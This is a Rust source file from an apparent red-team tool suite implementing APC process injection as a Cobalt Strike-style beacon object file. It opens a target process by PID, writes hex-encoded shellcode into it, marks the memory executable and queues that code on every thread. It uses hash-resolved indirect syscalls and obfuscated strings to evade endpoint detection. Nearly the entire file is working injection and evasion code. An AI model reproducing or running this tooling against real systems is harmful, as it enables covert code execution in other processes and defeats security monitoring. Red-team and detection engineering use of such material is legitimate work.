// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening — by Dani
// Original C: TrustedSec/cs-remote-ops/ntqueueapcthread
//
//! APC injection: queue user-mode shellcode as an APC against every
//! alertable thread of a target process. Uses indirect syscalls only.
//!
//! Args: <pid:u32> <shellcode-hex>
//!
//! Syscall flow:
//!   NtOpenProcess               (PROCESS_VM_OPERATION|VM_WRITE|QUERY_INFO)
//!   NtAllocateVirtualMemory     (RW)
//!   NtWriteVirtualMemory
//!   NtProtectVirtualMemory      (→ RX)
//!   NtQuerySystemInformation    (SystemProcessInformation)
//!     → enumerate threads of <pid>
//!   for each thread:
//!     NtOpenThread
//!     NtQueueApcThread
//!     NtClose
//!   NtClose (process)

#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use alloc::vec::Vec;
use common::{mitre::Technique, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1055.004", name: "Process Injection: APC Injection", tactic: "Defense Evasion" },
];

const PROCESS_ALL_NEEDED: u32 = 0x0010 | 0x0008 | 0x0020 | 0x0400 | 0x1000; // VM_OP|VM_WRITE|VM_READ|QUERY_INFO|...
const THREAD_SET_CONTEXT: u32 = 0x0010;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const STATUS_SUCCESS: i32 = 0;
const STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC0000004u32 as i32;
const SYSTEM_PROCESS_INFORMATION: u32 = 5;

#[repr(C)]
struct ObjectAttributes {
    length: u32, root_directory: usize, object_name: usize,
    attributes: u32, security_descriptor: usize, security_quality_of_service: usize,
}

#[repr(C)]
struct ClientId { unique_process: usize, unique_thread: usize }

fn parse_u32(s: &str) -> Option<u32> {
    let mut v: u32 = 0; let mut any = false;
    for b in s.bytes() {
        if !b.is_ascii_digit() { return None; }
        v = v.checked_mul(10)?.checked_add((b - b'0') as u32)?;
        any = true;
    }
    if any { Some(v) } else { None }
}

/// Decode a hex string ("4831C0..." or "48 31 C0 ...") into a Vec<u8>.
fn parse_hex(s: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(s.len() / 2);
    let mut hi: Option<u8> = None;
    for c in s.bytes() {
        let v = match c {
            b'0'..=b'9' => c - b'0',
            b'a'..=b'f' => c - b'a' + 10,
            b'A'..=b'F' => c - b'A' + 10,
            b' ' | b'\t' | b'\r' | b'\n' | b',' => continue,
            _ => return None,
        };
        match hi {
            None => hi = Some(v),
            Some(h) => { out.push((h << 4) | v); hi = None; }
        }
    }
    if hi.is_some() { return None; }
    if out.is_empty() { return None; }
    Some(out)
}


#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let pid_str = String::from(parser.get_str());
    let sc_hex  = String::from(parser.get_str());
    let pid_str = pid_str.as_str();
    let sc_hex  = sc_hex.as_str();
    if pid_str.is_empty() || sc_hex.is_empty() {
        return Err("usage: inject-apc <pid> <shellcode-hex>");
    }
    let pid: u32 = parse_u32(pid_str).ok_or("invalid pid")?;
    let mut sc = parse_hex(sc_hex).ok_or("invalid hex")?;

    use common::syscalls::{SyscallEntry, resolve, do_syscall4, do_syscall5, do_syscall6};

    // ---- 1. NtOpenProcess (4-arg) ----
    static OP_OPEN: SyscallEntry = SyscallEntry::new();
    const OPEN_HASH: u32 = common::hash::djb2(b"NtOpenProcess");
    let (op_ssn, op_addr) = unsafe { resolve(&OP_OPEN, OPEN_HASH) }
        .map_err(|_| "resolve NtOpenProcess")?;
    let oa = ObjectAttributes {
        length: core::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: 0, object_name: 0, attributes: 0,
        security_descriptor: 0, security_quality_of_service: 0,
    };
    let cid = ClientId { unique_process: pid as usize, unique_thread: 0 };
    let mut h_proc: usize = 0;
    let s = unsafe {
        do_syscall4(
            &mut h_proc as *mut usize as usize,
            PROCESS_ALL_NEEDED as usize,
            &oa as *const _ as usize,
            &cid as *const _ as usize,
            op_ssn, op_addr,
        )
    };
    if s != STATUS_SUCCESS || h_proc == 0 {
        common::evasion::secure_zero(&mut sc);
        return Err("NtOpenProcess failed");
    }

    // ---- 2. NtAllocateVirtualMemory (6-arg) ----
    static OP_ALLOC: SyscallEntry = SyscallEntry::new();
    const ALLOC_HASH: u32 = common::hash::djb2(b"NtAllocateVirtualMemory");
    let (a_ssn, a_addr) = unsafe { resolve(&OP_ALLOC, ALLOC_HASH) }
        .map_err(|_| "resolve NtAllocateVirtualMemory")?;
    let mut base: usize = 0;
    let mut sz: usize = sc.len();
    const MEM_COMMIT: u32 = 0x1000;
    const MEM_RESERVE: u32 = 0x2000;
    let s2 = unsafe {
        do_syscall6(
            h_proc,
            &mut base as *mut usize as usize,
            0,
            &mut sz as *mut usize as usize,
            (MEM_COMMIT | MEM_RESERVE) as usize,
            PAGE_READWRITE as usize,
            a_ssn, a_addr,
        )
    };
    if s2 != STATUS_SUCCESS {
        close_handle(h_proc);
        common::evasion::secure_zero(&mut sc);
        return Err("NtAllocateVirtualMemory failed");
    }

    // ---- 3. NtWriteVirtualMemory (5-arg) ----
    static OP_WRITE: SyscallEntry = SyscallEntry::new();
    const WRITE_HASH: u32 = common::hash::djb2(b"NtWriteVirtualMemory");
    let (w_ssn, w_addr) = unsafe { resolve(&OP_WRITE, WRITE_HASH) }
        .map_err(|_| "resolve NtWriteVirtualMemory")?;
    let mut written: usize = 0;
    let s3 = unsafe {
        do_syscall5(
            h_proc, base, sc.as_ptr() as usize, sc.len(),
            &mut written as *mut usize as usize,
            w_ssn, w_addr,
        )
    };
    // After write the local copy can go away.
    common::evasion::secure_zero(&mut sc);
    if s3 != STATUS_SUCCESS {
        close_handle(h_proc);
        return Err("NtWriteVirtualMemory failed");
    }

    // ---- 4. NtProtectVirtualMemory → RX (5-arg) ----
    static OP_PROT: SyscallEntry = SyscallEntry::new();
    const PROT_HASH: u32 = common::hash::djb2(b"NtProtectVirtualMemory");
    let (p_ssn, p_addr) = unsafe { resolve(&OP_PROT, PROT_HASH) }
        .map_err(|_| "resolve NtProtectVirtualMemory")?;
    let mut base2 = base;
    let mut sz2 = written;
    let mut old_prot: u32 = 0;
    let s4 = unsafe {
        do_syscall5(
            h_proc,
            &mut base2 as *mut usize as usize,
            &mut sz2 as *mut usize as usize,
            PAGE_EXECUTE_READ as usize,
            &mut old_prot as *mut u32 as usize,
            p_ssn, p_addr,
        )
    };
    if s4 != STATUS_SUCCESS {
        close_handle(h_proc);
        return Err("NtProtectVirtualMemory(RX) failed");
    }

    // ---- 5. Enumerate threads of the target via NtQuerySystemInformation
    let tids = enum_threads(pid)?;
    if tids.is_empty() {
        close_handle(h_proc);
        return Err("no threads found in target");
    }

    // ---- 6. NtQueueApcThread on each thread (4-arg) ----
    static OP_APC: SyscallEntry = SyscallEntry::new();
    const APC_HASH: u32 = common::hash::djb2(b"NtQueueApcThread");
    let (apc_ssn, apc_addr) = unsafe { resolve(&OP_APC, APC_HASH) }
        .map_err(|_| "resolve NtQueueApcThread")?;

    static OP_OT: SyscallEntry = SyscallEntry::new();
    const OT_HASH: u32 = common::hash::djb2(b"NtOpenThread");
    let (ot_ssn, ot_addr) = unsafe { resolve(&OP_OT, OT_HASH) }
        .map_err(|_| "resolve NtOpenThread")?;

    let mut queued = 0u32;
    for tid in tids {
        let mut h_thr: usize = 0;
        let cid_t = ClientId { unique_process: pid as usize, unique_thread: tid };
        let st = unsafe {
            do_syscall4(
                &mut h_thr as *mut usize as usize,
                THREAD_SET_CONTEXT as usize,
                &oa as *const _ as usize,
                &cid_t as *const _ as usize,
                ot_ssn, ot_addr,
            )
        };
        if st != STATUS_SUCCESS || h_thr == 0 { continue; }

        let st2 = unsafe { do_syscall4(h_thr, base, 0, 0, apc_ssn, apc_addr) };
        if st2 == STATUS_SUCCESS { queued += 1; }
        close_handle(h_thr);
    }

    close_handle(h_proc);
    obf! { let ok = "APC queued"; }
    println!("[+] {} on {} threads of pid {}", ok, queued, pid);
    Ok(())
}

fn close_handle(h: usize) {
    use common::syscalls::{SyscallEntry, resolve, do_syscall4};
    static OP_CLOSE: SyscallEntry = SyscallEntry::new();
    const CLOSE_HASH: u32 = common::hash::djb2(b"NtClose");
    if let Ok((c_ssn, c_addr)) = unsafe { resolve(&OP_CLOSE, CLOSE_HASH) } {
        let _ = unsafe { do_syscall4(h, 0, 0, 0, c_ssn, c_addr) };
    }
}

/// Walk SYSTEM_PROCESS_INFORMATION, return all thread IDs belonging to `pid`.
fn enum_threads(pid: u32) -> Result<Vec<usize>, &'static str> {
    use common::syscalls::{SyscallEntry, resolve, do_syscall4};
    static OP_QSI: SyscallEntry = SyscallEntry::new();
    const QSI_HASH: u32 = common::hash::djb2(b"NtQuerySystemInformation");
    let (q_ssn, q_addr) = unsafe { resolve(&OP_QSI, QSI_HASH) }
        .map_err(|_| "resolve NtQuerySystemInformation")?;

    let mut size: u32 = 65536;
    let buf;
    loop {
        let mut v: Vec<u8> = alloc::vec![0u8; size as usize];
        let mut ret_len: u32 = 0;
        let st = unsafe {
            do_syscall4(
                SYSTEM_PROCESS_INFORMATION as usize,
                v.as_mut_ptr() as usize,
                size as usize,
                &mut ret_len as *mut u32 as usize,
                q_ssn, q_addr,
            )
        };
        if st == STATUS_SUCCESS { buf = v; break; }
        if st == STATUS_INFO_LENGTH_MISMATCH {
            if size >= 64 * 1024 * 1024 { return Err("QSI buffer too large"); }
            size = size.saturating_mul(2);
            continue;
        }
        return Err("NtQuerySystemInformation failed");
    }

    // Walk entries: NextEntryOffset @ +0, NumberOfThreads @ +4,
    // UniqueProcessId @ +80. SYSTEM_THREAD_INFORMATION array starts
    // at offset 0x100 (256) on x64. Each is 0x40 (64) bytes; ClientId
    // at +0x28 (UniqueProcess @ 0x28, UniqueThread @ 0x30).
    const PROC_HEAD_SIZE: usize = 0x100;
    const THREAD_INFO_SIZE: usize = 0x40;
    const TID_OFFSET_IN_THREAD: usize = 0x30;
    let mut offset = 0usize;
    let mut out: Vec<usize> = Vec::new();
    let mut guard = 0usize;
    loop {
        if offset >= buf.len() { break; }
        guard += 1;
        if guard > 65536 { break; }
        let p = unsafe { buf.as_ptr().add(offset) };
        let next = unsafe { core::ptr::read_unaligned(p as *const u32) } as usize;
        let n_threads = unsafe { core::ptr::read_unaligned(p.add(4) as *const u32) } as usize;
        let upid = unsafe { core::ptr::read_unaligned(p.add(80) as *const usize) };
        if upid as u32 == pid {
            for i in 0..n_threads.min(1024) {
                let t_ptr = unsafe { p.add(PROC_HEAD_SIZE + i * THREAD_INFO_SIZE) };
                if (t_ptr as usize - buf.as_ptr() as usize) + THREAD_INFO_SIZE > buf.len() { break; }
                let tid = unsafe { core::ptr::read_unaligned(t_ptr.add(TID_OFFSET_IN_THREAD) as *const usize) };
                if tid != 0 { out.push(tid); }
            }
            return Ok(out);
        }
        if next == 0 || next < 64 { break; }
        offset = match offset.checked_add(next) {
            Some(v) if v <= buf.len() => v,
            _ => break,
        };
    }
    Ok(out)
}
